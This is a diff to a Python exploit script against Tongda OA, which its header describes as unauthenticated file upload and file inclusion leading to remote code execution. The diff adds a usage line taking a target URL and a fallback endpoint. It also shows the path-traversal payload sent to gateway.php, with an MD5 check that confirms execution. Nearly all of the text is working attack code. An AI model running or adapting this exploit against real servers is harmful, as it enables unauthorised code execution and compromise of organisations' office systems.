@@ -2,6 +2,8 @@
 # -*- encoding: utf-8 -*-
 # author: Chaser
 # 通达OA未授权任意文件上传及文件包含导致远程代码执行漏洞
+# usage: python tongda_oa_2020_rce.py [target_url]
+# 参考链接：https://www.anquanke.com/post/id/201174
 
 import sys
 import requests
@@ -36,7 +38,10 @@ def proof(file_name):
     }
     proof_data = 'json={"url":"/general/../../attach/im/2003/%s.jpg"} ' % file_name
     vul_url = f'{url}/ispirit/interface/gateway.php'
+    vul_url2 = f'{url}/mac/gateway.php'
     content = requests.post(vul_url, data=proof_data, headers=headers, proxies=proxies)
+    if content.status_code != 200:
+        content = requests.post(vul_url2, data=proof_data, headers=headers, proxies=proxies)
     if hashlib.md5(b'%d' % random_num).hexdigest() in content.text:
         return True
     else:
